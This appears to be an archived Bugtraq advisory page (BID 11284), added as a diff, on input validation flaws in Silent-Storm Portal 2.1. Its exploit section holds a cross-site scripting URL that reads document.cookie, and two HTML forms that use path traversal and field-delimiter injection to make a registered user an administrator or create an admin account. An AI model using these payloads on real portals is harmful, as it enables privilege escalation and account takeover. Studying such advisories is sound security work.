@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid11284<p><b><span style="font-size: 18pt;">Silent-Storm Portal Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11284/info">info</a><br><a href="http://www.securityfocus.com/bid/11284/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11284/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11284/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11284/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11284
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 30 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 30 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these vulnerabilities is credited to R00tCr4ck &lt;root@cyberspy.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Silent-Storm Silent-Storm Portal 2.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required, however the following examples are available:<br/><br/>http://www.example.com/index.php?module=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E<br/><br/><br/>Register a user account then login and run the exploit.html<br/><br/>---exploit.html----<br/>&lt;form method="post" action="http://www.example.com/index.php?module=../../profile"&gt;<br/>&lt;input type="text" name="mail" value="any@mail.com"&gt;&lt;br&gt;<br/>&lt;input type="hidden" name="mail" value="&lt;~&gt;1&lt;~&gt;"&gt;<br/>&lt;input type="submit" name="post" value="Get Admin!"&gt;<br/>&lt;/form&gt;<br/>---/exploit.html---<br/><br/>---exploit2.html----<br/>&lt;form method="post" action="http://www.example.com/index.php?module=../../Home"&gt;<br/>User:&lt;input type="text" name="usr" size="10"&gt;&lt;br&gt;<br/>Pass:&lt;input type="password" name="pas" size="10"&gt;&lt;br&gt;<br/>&lt;input type=hidden name="ema" value="any@mail.com&lt;~&gt;1&lt;~&gt;"&gt;&lt;br&gt;<br/>&lt;input type="submit" name="reg" value="Create Admin!"&gt;<br/>&lt;/form&gt;<br/>---/exploit2.html---
+	
+		<ul>
+</ul>
+</div>
